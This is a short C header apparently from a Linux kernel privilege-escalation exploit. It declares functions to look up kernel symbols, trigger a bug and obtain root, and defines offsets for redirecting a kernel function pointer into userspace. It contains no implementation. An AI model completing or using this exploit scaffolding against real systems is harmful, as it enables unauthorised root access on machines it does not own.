#ifndef _GETROOT_H
#define _GETROOT_H

#include <stdio.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <net/if.h>
#include <sched.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <unistd.h>

/* How many bytes should we clear in our
 * function pointer to put it into userspace? */
#ifdef __x86_64__
#define SHIFT 24
#define OFFSET 3
#else
#define SHIFT 8
#define OFFSET 1
#endif

unsigned long get_kernel_sym(char *name);
int trigger(int *fildes);
int getRoot(void);

#endif
